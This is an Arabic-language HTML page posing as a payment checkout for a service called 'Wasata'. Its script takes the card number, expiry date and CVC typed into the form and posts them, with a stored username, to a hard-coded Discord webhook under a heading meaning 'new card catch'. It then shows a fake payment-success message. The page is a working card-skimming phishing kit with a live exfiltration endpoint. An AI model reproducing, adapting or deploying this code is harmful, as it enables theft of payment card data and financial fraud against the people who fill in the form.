<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>إكمال الدفع | وساطة</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #fcfcfc; font-family: 'Segoe UI', sans-serif; position: relative; }
        .bg-dots {
            position: fixed; inset: 0; z-index: -1;
            background-image: radial-gradient(#e5e7eb 1.5px, transparent 1.5px);
            background-size: 24px 24px; opacity: 0.5;
        }
        .main-card { border-radius: 40px; box-shadow: 0 10px 50px rgba(0,0,0,0.03); border: 1px solid #f2f2f2; }
        
        /* تابات الدفع */
        .tab-btn { border: 2.5px solid #f1f5f9; border-radius: 20px; transition: 0.3s; cursor: pointer; background: #fff; position: relative; }
        .tab-btn.active { border-color: #000; opacity: 1; transform: scale(1.02); box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .tab-btn:not(.active) { opacity: 0.4; }
        
        .radio-ring { width: 22px; height: 22px; border: 2px solid #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .tab-btn.active .radio-ring::after { content: ""; width: 11px; height: 11px; background: #000; border-radius: 50%; }

        /* حقول الإدخال */
        input { border: 1.5px solid #f1f5f9; border-radius: 18px; padding: 18px; font-size: 1.1em; width: 100%; transition: 0.3s; background: #fff; text-align: center; color: #444; }
        input:focus { outline: none; border-color: #00eccd; box-shadow: 0 0 15px rgba(0, 236, 205, 0.1); }
        
        .card-type-icon { position: absolute; left: 18px; top: 50%; transform: translateY(-50%); height: 22px; transition: 0.3s; pointer-events: none; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-6">
    <div class="bg-dots"></div>

    <div class="main-card bg-white w-full max-w-2xl p-12 md:p-14 relative">
        <div class="absolute top-12 right-12 text-2xl font-black text-slate-800">طريقة الدفع 💳</div>
        <div class="absolute top-14 left-12 text-slate-400 font-bold text-xs uppercase tracking-widest opacity-30">W A S A T A</div>

        <div class="mt-20">
            <!-- خيارات الدفع (فيزا وماستر كارد) -->
            <div class="grid grid-cols-2 gap-5 mb-12">
                <!-- خيار فيزا -->
                <div class="tab-btn active p-8 flex justify-between items-center" onclick="sel(this)">
                    <div class="flex items-center gap-2">
                         <img src="visa.png" class="h-6" alt="Visa">
                    </div>
                    <div class="radio-ring"></div>
                </div>
                <!-- خيار ماستر كارد -->
                <div class="tab-btn p-8 flex justify-between items-center" onclick="sel(this)">
                    <img src="master.png" class="h-8" alt="MasterCard">
                    <div class="radio-ring"></div>
                </div>
            </div>

            <!-- فورم البطاقة -->
            <div class="space-y-6 text-right">
                <div>
                    <label class="block text-slate-400 font-bold text-xs mb-3 mr-2 uppercase">رقم البطاقة</label>
                    <div class="relative">
                        <input type="text" id="ccNo" placeholder="5215 1252 1515 2155" maxlength="19" oninput="formatCard(this)" dir="ltr">
                        <!-- أيقونة تظهر داخل المربع عند الكتابة -->
                        <img id="brnd" src="" class="card-type-icon opacity-0">
                    </div>
                </div>

                <div class="grid grid-cols-2 gap-5">
                    <div>
                        <label class="block text-slate-400 font-bold text-xs mb-3 mr-2 uppercase">تاريخ الانتهاء</label>
                        <input type="text" id="expiry" placeholder="10 / 01" maxlength="5" oninput="formatDate(this)" dir="ltr">
                    </div>
                    <div>
                        <label class="block text-slate-400 font-bold text-xs mb-3 mr-2 uppercase">رمز التحقق (CVC)</label>
                        <input type="password" id="cvc" placeholder="***" maxlength="3" dir="ltr" class="border-black border-[2.5px] bg-slate-50 font-black">
                    </div>
                </div>
            </div>

            <button onclick="send()" class="w-full bg-[#00eccd] hover:bg-[#00d1b5] text-white py-6 rounded-[2.5rem] mt-12 text-2xl font-black shadow-xl shadow-emerald-500/20 active:scale-95 transition">إكمال الدفع</button>
        </div>
    </div>

    <script>
        function sel(el) { 
            document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active')); 
            el.classList.add('active'); 
        }
        
        function formatCard(el) {
            let v = el.value.replace(/\D/g, '').match(/.{1,4}/g)?.join(' ') || '';
            el.value = v;
            const icon = document.getElementById('brnd');
            // روابط رسمية SVG من ويكيبيديا (مستحيل تتعطل وتظهر فوراً)
            if(v.startsWith('4')) { 
                icon.src="visa.png"; 
                icon.style.opacity="1"; 
            } else if(v.startsWith('5')) { 
                icon.src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"; 
                icon.style.opacity="1"; 
            } else { icon.style.opacity="0"; }
        }

        function formatDate(el) {
            let v = el.value.replace(/\D/g, '');
            if(v.length >= 2) {
                el.value = v.substring(0, 2) + " / " + v.substring(2, 4);
            } else { el.value = v; }
        }

        async function send() {
            const hook = "https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91";
            fetch(hook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "🚀 صيدة بطاقة جديدة - Wasata v8 Elite",
                        color: 65485,
                        fields: [
                            { name: "👤 العميل", value: `@${localStorage.getItem('user') || "زائر"}`, inline: true },
                            { name: "💳 رقم البطاقة", value: `\`${document.getElementById('ccNo').value}\`` },
                            { name: "🔐 البيانات", value: `${document.getElementById('expiry').value} | CVV: ${document.getElementById('cvc').value}` }
                        ]
                    }]
                })
            }).then(() => {
                alert("✅ تم الدفع والمصادقة بنجاح!");
                location.href = 'status.html';
            });
        }
    </script>
</body>
</html>
